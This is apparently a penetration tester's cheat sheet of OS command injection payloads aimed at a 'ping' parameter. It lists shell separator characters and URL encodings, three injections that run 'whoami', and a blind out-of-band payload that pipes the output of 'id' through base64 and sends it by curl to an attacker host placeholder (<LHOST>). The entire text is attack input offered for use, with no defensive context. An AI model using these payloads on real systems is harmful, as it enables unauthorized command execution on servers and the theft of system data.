```
# Test chars: ; | || && & ` $() \n %0a
ping=127.0.0.1; whoami
ping=127.0.0.1|whoami
ping=127.0.0.1`whoami`
# URL encoded semicolon: %3B
# Blind (OOB):
ping=127.0.0.1; curl http://<LHOST>/?x=$(id|base64)
```